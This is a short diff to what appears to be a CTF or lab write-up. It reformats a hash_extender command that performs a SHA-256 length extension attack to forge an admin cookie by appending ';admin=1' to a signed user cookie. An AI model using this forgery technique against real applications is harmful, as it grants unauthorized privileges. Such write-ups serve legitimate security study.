@@ -101,9 +101,8 @@ if (isset($_COOKIE["auth"]) && isset($_COOKIE["hsh"])) {
 ```
 
 
-```./hash_extender --data 'username=user;role=0' --append ';admin=1' --signature bfe0fa5c36531773c73dcc8d2a931301f69cf9add0  
-5a1f35dcfa2d48b44c37f0 --format sha256 --out-data-format=html
-```
+`./hash_extender --data 'username=user;role=0' --append ';admin=1' --signature bfe0fa5c36531773c73dcc8d2a931301f69cf9add05a1f35dcfa2d48b44c37f0 --format sha256 --out-data-format=html
+
 
 
 ![[modified_cookie.png]]
